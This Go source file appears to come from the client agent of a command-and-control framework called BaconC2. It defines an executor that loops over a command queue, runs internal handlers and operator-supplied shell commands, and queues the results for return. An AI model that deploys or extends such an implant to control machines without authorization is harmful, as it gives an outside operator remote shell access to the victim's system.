package executor

import (
	"fmt"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

type DefaultCommandExecutor struct {
	queue           queue.GenericQueue[models.Command]
	resultsQueue    queue.GenericQueue[models.CommandResult]
	transport       transport.ITransportProtocol
	config          *config.AgentConfig
	commandRegistry *command_handler.CommandHandlerRegistry
}

func NewDefaultCommandExecutor(queue queue.GenericQueue[models.Command], resultsQueue queue.GenericQueue[models.CommandResult], transport transport.ITransportProtocol, streamingTransport local_models.IStreamingTransport, cfg *config.AgentConfig, cmdRegistry *command_handler.CommandHandlerRegistry) models.ICommandExecutor {
	return &DefaultCommandExecutor{
		queue:           queue,
		resultsQueue:    resultsQueue,
		transport:       transport,
		config:          cfg,
		commandRegistry: cmdRegistry,
	}
}

func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.CommandResult {

	if cmd.Type == models.CommandTypeInternal {
		if handler, exists := e.commandRegistry.GetHandler(cmd.Command); exists {
			result := handler.Handler(cmd)
			if err := e.resultsQueue.Add(result); err != nil {
				fmt.Printf("Error queuing result for command %s: %v\n", cmd.ID, err)
			}
			return result
		}

		result := models.CommandResult{
			ID:     cmd.ID,
			Status: models.CommandStatusFailed,
			Output: "Internal command handler not found",
		}
		if err := e.resultsQueue.Add(result); err != nil {
			fmt.Printf("Error queuing result for command %s: %v\n", cmd.ID, err)
		}
		return result
	}

	if cmd.Type == models.CommandTypeShell {
		result := e.ExecuteShellCommand(cmd)
		if err := e.resultsQueue.Add(result); err != nil {
			fmt.Printf("Error queuing result for command %s: %v\n", cmd.ID, err)
			result.Status = models.CommandStatusFailed
			result.Output = fmt.Sprintf("Failed to queue result: %v", err)
		}
		return result
	}

	result := models.CommandResult{
		ID:     cmd.ID,
		Status: models.CommandStatusFailed,
		Output: fmt.Sprintf("Unsupported command type: '%s'", cmd.Type),
	}

	if err := e.resultsQueue.Add(result); err != nil {
		fmt.Printf("Error queuing result for command %s: %v\n", cmd.ID, err)
	}
	return result
}

func (e *DefaultCommandExecutor) ProcessCommandQueue() {
	for {
		cmd, ok := e.queue.Get()
		if !ok {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		result := e.Execute(cmd)

		if result.Status != models.CommandStatusCompleted {
			fmt.Printf("Command %s with: %s\n", cmd.ID, result.Output)
		} else {
			fmt.Printf("Command %s queued result\n", cmd.ID)
			e.queue.RemoveFirst()
		}

		time.Sleep(100 * time.Millisecond)
	}
}
